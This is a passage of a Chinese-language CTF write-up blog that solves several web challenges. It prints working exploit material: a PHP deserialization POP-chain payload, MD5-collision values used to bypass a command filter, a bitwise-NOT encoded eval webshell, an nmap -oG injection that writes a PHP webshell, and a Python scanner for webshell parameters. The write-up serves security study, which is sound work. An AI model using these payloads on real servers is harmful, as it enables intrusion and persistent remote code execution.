class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixio= no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;//过滤了ls tac cat等重要命令</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;//MD5强比较加上强转换</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step3:</span><br><span class="line">payload:</span><br><span class="line">在bp上传，在hackbar里传会再经过一次编码</span><br><span class="line">url/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=ca\t%20/flag </span><br><span class="line">POST</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><h4 id="考点-13"><a href="#考点-13" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-11"><a href="#解题过程-11" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">代码审计</span><br><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);//include函数可以想到文件包含漏洞</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">注意到Modifier里面有include,要想办法进入这里面，调用里面的invoke方法，invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</span><br><span class="line">注意到_get里面有return $function()要想办法调用__get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)</span><br><span class="line">然后因为反序列化时候先调用_wakeup方法，以及show类里面有toString方法(在对象当做字符串的时候会被调用。)</span><br><span class="line">所以可以可以另$this-&gt;source实例化show类就调用了_toString,然后令strT实例化test，Test里面不存在source属性，就直接调用_get方法</span><br><span class="line">另p实例化为Modifier就进入了,_get方法把p当做函数使用就调用了_invoke</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//pop链</span><br><span class="line">$a=new show();</span><br><span class="line">$a-&gt;source=new show();</span><br><span class="line">$a-&gt;source-&gt;str=new Test();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p=new Modifier();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/?pop=O%3A4%3A&quot;Show&quot;%3A2%3A&#123;s%3A6%3A&quot;source&quot;%3BO%3A4%3A&quot;Show&quot;%3A2%3A&#123;s%3A6%3A&quot;source&quot;%3BN%3Bs%3A3%3A&quot;str&quot;%3BO%3A4%3A&quot;Test&quot;%3A1%3A&#123;s%3A1%3A&quot;p&quot;%3BO%3A8%3A&quot;Modifier&quot;%3A1%3A&#123;s%3A6%3A&quot;%00*%00var&quot;%3Bs%3A57%3A&quot;php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php&quot;%3B&#125;&#125;&#125;s%3A3%3A&quot;str&quot;%3BN%3B&#125;</span><br></pre></td></tr></table></figure>

<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><h4 id="考点：-9"><a href="#考点：-9" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http：xff头</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-18"><a href="#解题过程：-18" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">点击购买，二维码扫出来：</span><br><span class="line">拜托！你不会真的想PY到flag吧，这样可是违规的！再好好分析一下界面代码吧</span><br><span class="line">step2:</span><br><span class="line">收集信息，在那个源代码看到 JavaScript Libraries 在js lib那个index里面看到/flag直接访问</span><br><span class="line">看到了ip,想到更改更改ip</span><br><span class="line">step3:</span><br><span class="line">使用插件更改xff为127.0.0.1然后再源代码里拿到</span><br><span class="line">/ps:这里尝试过用hackbar添加不能过/</span><br></pre></td></tr></table></figure>

<h2 id="RCE-3"><a href="#RCE-3" class="headerlink" title="RCE"></a>RCE</h2><h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><h4 id="考点-14"><a href="#考点-14" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.取反绕过</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-10"><a href="#知识点：-10" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.对于PHP，形如 `(func_name)(内容)`，其中func_name可以是会执行这个func</span><br><span class="line">2.取反之后会变成字符串</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-19"><a href="#解题过程：-19" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> step1:代码审计</span><br><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);//可以命令执行</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br><span class="line">因为这里过滤了所有的大小写和数字所以进行取反绕过在urlencode就可以绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">取反urlencode编码绕过：</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$a=&#x27;assert&#x27;;//</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$c=&#x27;(eval($_POST[aaa]))&#x27;;//</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo $d;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step2:</span><br><span class="line">要在这块传木马过程，(assert)(eval ($_post[aaa]))我们要把他取放放进去</span><br><span class="line">/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6);</span><br><span class="line">用蚁剑连接上去了，但是在flag没有内容，有readflag这个文件，/readflag会有一个s权限 ，就是不能让你直接cat或者执行，需要绕过phpinfo里的disable_functions（别人的解释）</span><br><span class="line">解法一：</span><br><span class="line">所以可以用蚁剑一个插件去绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">法二：利用 LD_PRELOAD 环境变量</span><br></pre></td></tr></table></figure>

<h1 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意事项：</span><br><span class="line">1.php 7+</span><br><span class="line">2.放在phpstudy-&gt;网站根目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">print(&#x27;开始时间：  &#x27; + time.asctime(time.localtime(time.time())))  # 只是一个简单的时间函数，看起来更漂亮罢了</span><br><span class="line">s1 = threading.Semaphore(100)  # 这儿设置最大的线程数</span><br><span class="line">filePath = r&quot;F:\web\phpstudy\WWW\src&quot;</span><br><span class="line">os.chdir(filePath)  # 改变当前的路径，这个还是不太懂</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5  # 设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files = os.listdir(filePath)  # 得到该目录下所有文件的名称</span><br><span class="line">session = requests.Session()  # 得到session()为之后的实现代码回显得取创造条件</span><br><span class="line">session.keep_alive = False  # 设置连接活跃状态为False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()  # 好像与锁什么的相关，但是还是不太懂，多线程开启</span><br><span class="line">    print(&#x27;trying   &#x27; + file + &#x27;     &#x27; + time.asctime(time.localtime(time.time())))  # 更好看，同时可以对比不加线程和加线程的时间对比</span><br><span class="line">    with open(file, encoding=&#x27;utf-8&#x27;) as f:  # 打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">        gets = list(re.findall(&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">        posts = list(re.findall(&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">    data = &#123;&#125;  # 所有的$_POST</span><br><span class="line">    params = &#123;&#125;  # 所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    url = &#x27;http://127.0.0.1/src/&#x27; + file</span><br><span class="line">    req = session.post(url, data=data, params=params)  # 一次性请求所有的GET和POST</span><br><span class="line">    req.close()  # 关闭请求  释放内存</span><br><span class="line">    req.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    content = req.text</span><br><span class="line">    # print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:  # 如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url + &#x27;?%s=&#x27; % a + &quot;echo &#x27;xxxxxx&#x27;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()  # 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b: &quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()  # 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1:  # flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&#x27;找到了利用文件： &#x27; + file + &quot;  and 找到了利用的参数：%s&quot; % param)</span><br><span class="line">        print(&#x27;结束时间：  &#x27; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()  # 对应于之前的多线程打开</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in files:  # 加入多线程</span><br><span class="line">    t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-20"><a href="#解题过程：-20" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">访问下载/www.tar.gz	备份源码</span><br><span class="line">step2:</span><br><span class="line">看到有一堆php文件，打开几个看到有GET，POST传参，一些getshell文件，用脚本把get，post这些文件找出来,在本地搭建一个靶机，遍历这些文件那个有效（脚本在上面）</span><br><span class="line">step3:</span><br><span class="line">找到直接访问就是</span><br></pre></td></tr></table></figure>

<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><h4 id="知识点：-11"><a href="#知识点：-11" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一些Unicode表示的含义是一样的，可以用来绕过</span><br><span class="line">https://www.compart.com/en/unicode/</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-21"><a href="#解题过程：-21" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">让我们买马，在id输入1，price输入对应的回显Wrong commodity!  1，2，3都是一样的回显</span><br><span class="line">到4的时候回显Only one char(?) allowed!  只让输入一个字符</span><br><span class="line">step2:</span><br><span class="line">在那个网站上找到对应的大于1337数字的替换，我用的𐄣（2000）就可以了</span><br></pre></td></tr></table></figure>

<h2 id="nmap写文件"><a href="#nmap写文件" class="headerlink" title="nmap写文件"></a>nmap写文件</h2><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><h4 id="考点-15"><a href="#考点-15" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap写文件</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-12"><a href="#解题过程-12" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这道题和[BUUCTF 2018]Online Tool差不多</span><br><span class="line">step1:</span><br><span class="line">给了一个输入框，在这里尝试写一下文件</span><br><span class="line">&#x27; &lt;?php eval($_POST[&quot;666&quot;]);?&gt; -oG 1.php &#x27;</span><br><span class="line">回显hacker是做了过滤</span><br><span class="line">尝试&#x27; &lt;?= @eval($_POST[&quot;666&quot;]); ?&gt; -oG 1.php &#x27;还是回显Hacker...&#x27; &lt;?= @eval($_POST[&quot;666&quot;]); ?&gt; -oG 1.phtml &#x27;Host maybe down</span><br><span class="line">访问1.phtml有回显</span><br><span class="line">step2:</span><br><span class="line">666=phpinfo();有回显</span><br><span class="line">就可以传参拿到flag</span><br></pre></td></tr></table></figure>

<h2 id="代码审计-动态调用"><a href="#代码审计-动态调用" class="headerlink" title="代码审计&amp;动态调用"></a>代码审计&amp;动态调用</h2><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><h4 id="考点：-10"><a href="#考点：-10" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态调用</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-22"><a href="#解题过程：-22" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">在源码代码里面看到./time.php?source访问一下得到源码</span><br><span class="line"> &lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2024-07-18 01:39:54</span><br><span class="line">step2：</span><br><span class="line">看页面的回显，在看到 $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;;   echo $b($a); </span><br><span 